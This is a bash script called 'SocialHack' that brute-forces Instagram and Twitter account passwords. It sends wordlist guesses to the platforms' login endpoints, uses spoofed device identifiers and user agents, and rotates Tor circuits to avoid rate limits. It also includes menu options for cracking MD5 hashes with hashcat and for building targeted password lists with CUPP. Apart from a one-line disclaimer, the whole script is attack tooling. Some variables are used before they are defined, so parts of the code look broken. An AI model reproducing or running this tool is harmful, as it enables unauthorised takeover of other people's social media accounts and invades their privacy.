#!/bin/bash
#coded by Fadester
#v1.1

#Colors

green='\033[1;32m'
red='\033[0;31m'
yellow='\e[0m\e[1;93m'
lightgreen='\e[1;32m'
farblos='\e[0m'
BlueF='\e[1;34m'
cyan='\e[0;36m'
lightred='\e[101m'
blink='\e[5m'
clear
chmod +x tools/cupp.py
location=$(pwd)
banner() {

printf " \e[1;92m   ____             _       _\e[1;33m _   _            _    \e[0m\n "
printf " \e[1;92m / ___|  ___   ___(_) __ _| |\e[1;33m | | | __ _  ___| | __\e[0m\n "
printf " \e[1;92m \___ \ / _ \ / __| |/ _  | |\e[1;33m |_| |/ _  |/ __| |/ /\e[0m\n "
printf " \e[1;92m  ___) | (_) | (__| | (_| | |\e[1;33m  _  | (_| | (__|   < \e[0m\n "
printf " \e[1;92m |____/ \___/ \___|_|\____|_|\e[1;33m_| |_|\____|\___|_|\_\ \e[0m\n "
echo
printf "\e[0;36mcoded by Fadester\e[0m\n"
printf "\e[0;36mv1.1\e[0m\n"
echo ""
printf "\e[5m\e[31mDISCLAIMER\e[0m\n"
printf "\e[101m Invading the privacy of others is illegal and I'm not liable for anything!\e[0m\n"
}

if [ $(id -u) != "0" ]; then

	echo -e "$yellow" [!]::[Check Dependencies] ;
	sleep 0.5
	echo -e $green [✔]::[Check User]: $USER ;
	sleep 0.
	echo -e $red [x]::[not root]: you need to be [root] to run this script.;
       	echo ""
	sleep 1
	exit

else

	echo -e "\e[0m\e[1;93m" [!]::[Check Dependencies]: ;
	sleep 0.5
	echo -e "\033[1;32m" [✔]::[Check User]: $USER ;

	sleep 0.5
fi

ping -c 1 google.com > /dev/null 2>&1
png="$?"

if [ $png == "0" ]
then
	echo -e $green [✔]::[Internet Connection]: CONNECTED!;
	sleep 0.5
elif [ $png == "1" ]
then
	echo -e $yellow [✔]::[Internet Connection]: LOCAL ONLY!;
elif [ $png == "2" ];
then
	echo -e $red [✔]::[Internet Connection]: OFFLINE!;
fi
which /usr/bin/curl > /dev/null 2>&1
	if [[ "$?" -eq "0" ]]; then
		sleep 0.5
		echo -e $green [✔]::[curl]: FOUND! ;
	else
		echo -e "$yellow installing curl..."
		apt-get install -y curl > /dev/null 2>&1
	fi
	
which /usr/bin/openssl > /dev/null 2>&1
	if [[ "$?" -eq "0" ]]; then
		sleep 0.5
		echo -e $green [✔]::[openssl]: FOUND! ;
	else
		echo -e $yellow installing openssl...
		apt-get install -y openssl > /dev/null 2>&1
	fi

which /usr/bin/xterm > /dev/null 2>&1
	if [[ "$?" -eq "0" ]]; then
		sleep 0.5
		echo -e $green [✔]::[xterm]: FOUND! ;
	else
		sleep 1
		echo -e $yellow installing xterm...
		apt-get install -y xterm > /dev/null 2>&1
	fi

which /usr/bin/hashcat > /dev/null 2>&1
    if [ "$?" -eq "0" ]; then
    	sleep 0.5
    	echo -e $green [✔]::[hashcat]: FOUND! ;
	else
		sleep 1
		echo -e $yellow installing hashcat...
		apt-get install -y hashcat > /dev/null 2>&1
	fi

which /usr/bin/wc > /dev/null 2>&1
	if [[ "$?" -eq "0" ]]; then
		sleep 0.5
		echo -e $green [✔]::[wc]: FOUND! ;
	else
		sleep 1
		echo -e $yellow installing wc...
		apt-get install -y wc > /dev/null 2>&1
	fi

which /usr/bin/wget > /dev/null 2>&1
	if [[ "$?" -eq "0" ]]; then
		sleep 0.5
		echo -e $green [✔]::[wget]: FOUND! ;
        else
                sleep 1
                echo -e $yellow installing wget...
                apt-get install -y wget > /dev/null 2>&1
        fi

	sleep 1
clear



trap ctrl_c INT
ctrl_c() {
echo ""
echo -e $yellow [*] Ctrl+C Detected
sleep 1
clear
echo
echo -e "$yellow" "[*] Follow me on Github :)"
sleep 0.5
echo
echo -e $yellow [*] Follow me on Instagram: fadester_04
sleep 0.5
echo
echo -e $yellow [*] Thank you for using SocialHack =D
exit
}

create_wordlist() {
cupp="tools/cupp.py"
clear
xterm -T " SocialHack " -bg black -fg white -fa monaco -fs 9 -geometry 110x16-0+0 -hold -e $cupp -i &
sleep 1
echo -e $green COMPLETE
sleep 1.5
clear
banner
eingabe
}

hackAcc() {
clear 
echo -e "$yellow  _   _            _    $green  ___           _        $red     _             $farblod "                                                                                                 
echo -e "$yellow | | | | __ _  ___| | __$green |_ _|_ __  ___| |_ __ _ $red    / \   ___ ___  $farblos "                                                                                                 
echo -e "$yellow | |_| |/ _  |/ __| |/ /$green  | ||  _ \/ __| __/ _  |$red   / _ \ / __/ __| $farblos "                                                                                                 
echo -e "$yellow |  _  | (_| | (__|   < $green  | || | | \__ \ || (_| |$red  / ___ \ (_| (__  $farblos "                                                                                                 
echo -e "$yellow |_| |_|\__,_|\___|_|\_\ $green|___|_| |_|___/\__\__,_|$red /_/   \_\___\___| $farblos "
echo ""
read -p $'\e[0;36m┌─[\e[0m\e[1;93musername\e[0m\e[0;36m]─[\033[0;31mnoob\e[0;36m]
└──╼ $\e[0m ' user
read -p $'\e[0;36m┌─[\e[0m\e[1;93mwordlist\e[0m\e[0;36m]─[\033[0;31mnoob\e[0;36m]
└──╼ $\e[0m ' wl

wc_wordlist=$(wc -l $wl)
echo ""
echo -e [$green*$farblos]"$yellow" $wc_wordlist "$farblos"
sleep 0.5
echo ""
echo -e "$green Attack$red $user $farblos"
echo ""

counter=0
proxy_counter=1
startline=1
endline=1
token=0
phone="$string8-$string4-$string4-$string4-$string12"
var2=$(echo $var | grep -o 'csrftoken=.*' | cut -d ';' -f1 | cut -d '=' -f2)
guid="$string8-$string4-$string4-$string4-$string12"
data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
string4=$(openssl rand -hex 32 | cut -c 1-4)
string12=$(openssl rand -hex 32 | cut -c 1-12)
string8=$(openssl rand -hex 32  | cut -c 1-8)
string16=$(openssl rand -hex 32 | cut -c 1-16)
device="android-$string16"
turn=$((stard+end))
charsinwl=$(wc -l $wl | cut -d " " -f1)
while [ "$token" -lt "$charsinwl" ]; do
for pass in $( sed -n ''$startline','$endline'p' $wl); do

header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
IFS=$'\n'
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

printf "\e[1;77m[\e[0m\e[1;92m!\e[0m\e[1;77m] Try pass: \e[0m\e[1;93m %s\e[0m\n" $pass

IFS=$'\n'
var=$(curl -c cookie.$user -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq );
if [[ $var == "challenge" ]]; then pw_found ; eingabe; elif [[ $var == "logged_in_user" ]]; then pw_found ; eingabe; elif [[ $var == "Please wait" ]]; then echo -e "$red Please wait $farblos" ; sleep 120 ; fi ;

let counter++
curl -c cookie.$user -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://instagram.com/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq
let startline+=1
let endline+=1
killall -HUP tor
done
done

sleep 2.5
echo COMPLETE
echo ""
eingabe
}

pw_found() {
echo ""
echo -e $green Password found!
echo -e $BlueF ============================
echo -e $green Username$farblos: $yellow$user
echo -e $green Password$farblos: $yellow$pass
echo -e $BlueF ============================
echo -e $lightgreen "HANGUUUUUP!"$yellow":)"
echo ""
eingabe
}

ip_blocked() {
	echo ""
	echo -e $yellow Blocked!
	echo -e $yellow Try again later
	echo ""
	eingabe
}

hack_twitter() {
clear 
echo -e "$red  _   _            _    $BlueF  _____          _ _   _            $yellow     _             $farblos"
echo -e "$red | | | | __ _  ___| | __$BlueF |_   _|_      _(_) |_| |_ ___ ____ $yellow    / \   ___ ___  $farblos"
echo -e "$red | |_| |/ _  |/ __| |/ /$BlueF   | | \ \ /\ / / | __| __/ _ \  __|$yellow   / _ \ / __/ __| $farblos"
echo -e "$red |  _  | (_| | (__|   < $BlueF   | |  \ V  V /| | |_| ||  __/ |   $yellow  / ___ \ (_| (__  $farblos"
echo -e "$red |_| |_|\__ _|\___|_|\_\ $BlueF  |_|   \_/\_/ |_|\__|\__\___|_|   $yellow /_/   \_\___\___| $farblos"
echo ""
read -p $'\e[0;36m┌─[\e[0m\e[1;93musername\e[0m\e[0;36m]─[\033[0;31mnoob\e[0;36m]
└──╼ $\e[0m ' user
read -p $'\e[0;36m┌─[\e[0m\e[1;93mwordlist\e[0m\e[0;36m]─[\033[0;31mnoob\e[0;36m]
└──╼ $\e[0m ' wl

echo ""
_start=1
_end=1
while [ true ]; do
for pass in $(sed -n ''$_start','$_end'p' $wl); do 

uagent="Mozilla/5.0 (Series40; NokiaX2-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11"
token=0

hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Twitter 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
phone="$string8-$string4-$string4-$string4-$string12"
device="android-$string16"
guid="$string8-$string4-$string4-$string4-$string12"
var2=$(echo $var | grep -o 'csrftoken=.*' | cut -d ';' -f1 | cut -d '=' -f2)
COOKIES='cookies'$countpass''
countpass=$(grep -n "$pass" "$wl" | cut -d ":" -f1)

echo -e "$cyan[$red*$cyan]$yellow Try pass $green$pass"

initpage=$(curl  -s -b $COOKIES -c $COOKIES -L -A "$uagent" "https://mobile.twitter.com/session/new") 

tokent=$(echo "$initpage" | grep "authenticity_token" | sed -e 's/.*value="//' | cut -d '"' -f 1 | head -n 1) 
var=$(curl   -s -b $COOKIES -c $COOKIES -L -A "$uagent" -d "authenticity_token=$tokent&session[username_or_email]=$user&session[password]=$pass&remember_me=1&wfa=1&commit=Log+in" "https://mobile.twitter.com/sessions") 

if [[ "$var" == *"If you’re not redirected soon"* ]]; then pw_found_twitter_verify ; rm -rf cookies*; kill -1 $$; eingabe
elif [[ "$var" == *"/account/login_challenge"* ]]; then pw_found_twitter ; rm -rf cookies*; kill -1 $$; eingabe
elif [[ "$var" == *"/compose/tweet"* ]]; then pw_found_twitter ; rm -rf cookies*; kill -1 $$; fi & done; wait $!; eingabe

let _start++
let _end++
if [[ $countpass == $_start ]]; then 
    echo ""
    echo -e "$cyan[$red!$cyan]$yellow Wordlist end$red! $farblos "
    exit 1
fi
killall -HUP tor > /dev/null 2>&1 
done

}

pw_found_twitter() {
echo ""
echo -e $green Password found!
echo -e $BlueF ============================
echo -e $green Username$farblos: $yellow$user
echo -e $green Password$farblos: $yellow$pass
echo -e $BlueF ============================
echo -e $lightgreen "HANGUUUUUP!"$yellow":)"
echo ""
eingabe
}

pw_found_twitter_verify() {
echo ""
echo -e $green Password found!
echo -e $BlueF ============================
echo -e $green Username$farblos: $yellow$user
echo -e $green Password$farblos: $yellow$pass
echo -e $yellow You need verify! $farblos
echo -e $BlueF ============================
echo -e $lightgreen "HANGUUUUUP!"$yellow":)"
echo ""
exit 
}

crackhash() {
clear
figlet crackhash
echo
printf " \e[0m\e[1;93m[\e[0m\e[1;77m1\e[0m\e[1;31m\e[0m\e[1;93m]\033[1;32m Brute Force\e[0m\n"
printf " \e[0m\e[1;93m[\e[0m\e[1;77m2\e[0m\e[1;31m\e[0m\e[1;93m]\033[1;32m Wordlist\e[0m\n"
echo
read -p $'\e[0;36m┌─[\e[0m\e[1;93moption\e[0m\e[0;36m]─[\033[0;31mnoob\e[0;36m]
└──╼ $\e[0m ' option1

if [[ $option1 == "1" ]];
then
	read -p $'\e[0;36m┌─[\e[0m\e[1;93mhash_file\e[0m\e[0;36m]─[\033[0;31mnoob\e[0;36m]
└──╼ $\e[0m ' hash1
	xterm -bg black -fg white -fa monaco -fs 9 -geometry 110x16-0+0 -hold -e hashcat -a 3 -m 0 $hash1 --force
elif [[ $option1 == "2" ]]; then
	read -p $'\e[0;36m┌─[\e[0m\e[1;93mhash_file\e[0m\e[0;36m]─[\033[0;31mnoob\e[0;36m]
└──╼ $\e[0m ' hash2
	read -p $'\e[0;36m┌─[\e[0m\e[1;93mwordlist\e[0m\e[0;36m]─[\033[0;31mnoob\e[0;36m]
└──╼ $\e[0m ' wl
	xterm -bg black -fg white -fa monaco -fs 9 -geometry 110x16-0+0 -hold -e hashcat -a 0 -m 0 $hash2 $wl --force
fi
sleep 1
echo COMPLETE
clear
banner
eingabe
}


eingabe() {
printf  "\e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Hack Instagram Acc \e[0m\n"
printf  "\e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Hack Twitter Acc \e[0m\n"
printf  "\e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Crack hash \033[0;31m"
printf  "
\e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m create wordlist \e[0m"
echo
echo ""
read -p $'\e[0;36m┌─[\e[0m\e[1;93mchoose\e[0m\e[0;36m]─[\033[0;31mnoob\e[0;36m]
└──╼ $\e[0m ' option1
if [[ $option1 == "1" ]];
then
hackAcc
elif [[ $option1 == "2" ]];
then
	hack_twitter
elif [[ $option1 == "3" ]];
then
	crackhash
elif [[ $option1 == "4" ]];
then 
	create_wordlist
else
	echo -e $BlueF[$yellow!$BlueF]$red invalid option$yellow!
	sleep 1.5
	clear
	banner
	eingabe
fi
}

banner
eingabe
